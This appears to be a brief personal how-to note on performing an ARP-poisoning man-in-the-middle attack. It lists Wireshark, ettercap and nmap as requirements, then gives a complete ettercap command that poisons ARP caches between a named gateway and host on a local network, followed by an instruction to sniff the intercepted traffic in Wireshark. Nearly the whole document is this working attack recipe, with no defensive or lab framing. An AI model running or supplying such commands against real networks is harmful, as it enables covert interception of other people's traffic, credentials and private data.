# How to perform a man-in-the-middle (ARP poisoning) attack

## requirements

- wireshark
- ettercap-text-only
- nmap

## steps

- sudo ettercap -T -S -i wlp0s20f3 -M arp:remote /192.168.31.1// /192.168.31.13
- open wireshark with sudo and perform packet sniffing on the interface
